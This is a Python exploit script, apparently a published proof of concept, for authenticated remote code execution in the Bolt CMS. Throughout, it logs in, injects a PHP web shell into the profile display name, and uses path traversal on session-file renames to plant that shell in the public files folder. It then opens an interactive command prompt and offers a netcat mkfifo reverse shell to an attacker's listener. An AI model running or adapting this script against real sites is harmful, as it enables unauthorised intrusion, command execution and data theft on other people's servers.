#!/usr/bin/env python3
import requests
import re 
import sys
import random
import string
import urllib.parse


class bcolors:
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    FAIL = '\033[91m'
    WARNING = '\033[93m'
    ORANGE='\033[33m'
    darkgrey='\033[37m'
    ENDC = '\033[0m'
if len(sys.argv) != 4:
    print ("[~] Usage : ./bolt.py <http://IP address:8000> <username> <password>")
    sys.exit()
url = sys.argv[1]
validation = url.endswith("/")
if validation == True:
	print (bcolors.WARNING + "[!] URL seems odd correcting the problem" + bcolors.ENDC)
	url = re.sub("\/$", "", url)
login_url = f"{url}/bolt/login"
username = sys.argv[2]
password = sys.argv[3]
payload = """<?php system($_GET['bolt']);?>"""


sess = requests.session()
print (bcolors.ORANGE + "[i] Author: Musyoka" + bcolors.ENDC)
#Grabbing the cross site request forgery token
login_token = (sess.get(login_url).text)
token = re.search('user_login\[_token\]" value="(.*?)"', login_token).group(1)
print (bcolors.OKGREEN + "[+] Cross Site Requetst Forgery Token Geneated Successfully" + bcolors.ENDC)
print (bcolors.OKGREEN + "[+] Login Token assigned: "+ bcolors.ENDC + bcolors.OKBLUE + token + bcolors.ENDC)
#login in to the web application
postdata = {
"user_login[username]" : username,
"user_login[password]" : password,
"user_login[login]" : "",
"user_login[_token]" : token
}

print()
print (bcolors.ORANGE + "===> lOGGING IN PLEASE BE PATIENT" + bcolors.ENDC)
login = sess.post(login_url, data=postdata, allow_redirects=False).text
if "Redirecting to /bolt" in login:
	print (bcolors.darkgrey + f"[+] Username: {username} and password: {password} supplied is valid" + bcolors.ENDC)
else:
	print (bcolors.FAIL + "[-] Invalid credentials provided exiting" + bcolors.ENDC)
	sys.exit()
# sending PHP payload
profile = sess.get(f"{url}/bolt/profile").text
profile_token = re.search('user_profile\[_token\]" value="(.*?)"', profile).group(1)
email = re.search('control" value="(.*?)"', profile).group(1)
print(bcolors.OKGREEN + "[+] Profile Token assigned: " + bcolors.ENDC + bcolors.OKBLUE + profile_token + bcolors.ENDC)
print()
print (bcolors.OKGREEN + "[+] Email to be used: " + bcolors.ENDC + bcolors.OKBLUE + email + bcolors.ENDC)
data = {
"user_profile[password][first]" : password,
"user_profile[password][second]" : password,
"user_profile[email]" : email,
"user_profile[displayname]" : payload,
"user_profile[save]=" : "",
"user_profile[_token]" : profile_token
}
print (bcolors.OKGREEN + "[+] Injecting payload in the username field" + bcolors.ENDC)
print (bcolors.OKGREEN + "[+] Payload used: " + bcolors.ENDC + bcolors.OKBLUE + f"{payload}" + bcolors.ENDC)
creating_payload = sess.post(f"{url}/bolt/profile", data=data)
profiles = sess.get(f"{url}/bolt/profile").text
profiles_confirm = re.search("Profile(.*?)Bolt", profiles, re.DOTALL).group(1)
if "system" in profiles_confirm:
	print (bcolors.OKGREEN + "[+] Payload injected in the Username successfully" + bcolors.ENDC)
else:
	print (bcolors.FAIL + "[-] Payload wasn't injected \nExiting..." + bcolors.ENDC)
	sys.exit()
session_match= sess.get(f"{url}/async/browse/cache/.sessions").text
session = re.findall('span class="entry disabled">(.*?)</span>', session_match)
csrf_token1 = sess.get(f"{url}/bolt/overview/showcases")
csrf_token = re.search('data-bolt_csrf_token="(.*?)"', csrf_token1.text).group(1)
print()
print (bcolors.OKGREEN + "[+] Showcase CSRF Token: " + bcolors.ENDC + bcolors.OKBLUE + f"{csrf_token}" + bcolors.ENDC)
for i in session:
	fname = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(6))
	session_postdata = {
	"namespace": "root",
	"parent": "/app/cache/.sessions",
	"oldname": i,
	"newname" : f"../../../public/files/{fname}.php",
	"token": csrf_token
	}
	print()
	print (bcolors.ORANGE + f"[+] Used token {i} to create {fname}.php" + bcolors.ENDC)
	confirm = sess.post(f"{url}/async/folder/rename", data=session_postdata)
	#print()
	print (f"shell created has the name {fname}.php")
	print (confirm.text)
	#print()
	shell = sess.get(f'{url}/files/{fname}.php?bolt=echo "shellz"').text
	if "shellz" in shell:
		print()
		print (bcolors.OKGREEN + "[+] Command shell session 1 opened" + bcolors.ENDC)
		print (bcolors.ORANGE + "[+] To Get a Reverse shell Press: " + bcolors.ENDC + bcolors.WARNING + "1" + bcolors.ENDC)
		print (bcolors.FAIL + "[!] Type exit to leave the terminal" + bcolors.ENDC)
		while True:
			print()
			cmd = input("Bolt-RCE$ ")
			if cmd == "exit":
				print (bcolors.WARNING + f"[-] Deleting Web-Shells Created..." + bcolors.ENDC)
				sess.get(f"{url}/files/{fname}.php?bolt=rm *")
				print (bcolors.FAIL + "===> Goodbye :(" + bcolors.ENDC)
				sys.exit()
			elif str("1") in cmd:
				print()
				print (bcolors.ORANGE + "==============================================\nType in the LHOST and LPORT to be used\n==============================================" + bcolors.ENDC)
				reverse_payload = f"(mkfifo /tmp/{fname}; nc " 
				reverse_payload += input(bcolors.OKBLUE + "LHOST: ")
				reverse_payload += " "
				reverse_payload += input("LPORT: ")
				reverse_payload += f" 0</tmp/{fname} | /bin/sh >/tmp/{fname} 2>&1; rm /tmp/{fname}) > /dev/null &" + bcolors.ENDC
				reverse_payload = urllib.parse.quote(reverse_payload)
				try:
					sess.get(f"{url}/files/{fname}.php?bolt={reverse_payload}", timeout=5)
				except:
					print ("it seems like you got a shell ;)")
					sys.exit()
			else:
				output = (sess.get(f"{url}/files/{fname}.php?bolt={cmd}").text).strip()
				output = re.search('displayname";s:30:"(.*?)"',output, re.DOTALL).group(1)
				print (output.strip())
				if not output:
					print (bcolors.ORANGE + "Error" + bcolors.ENDC)
	else:
		print (bcolors.FAIL + "[-] Retriying with a different session token we didn't get a shell" + bcolors.ENDC)
		print ()
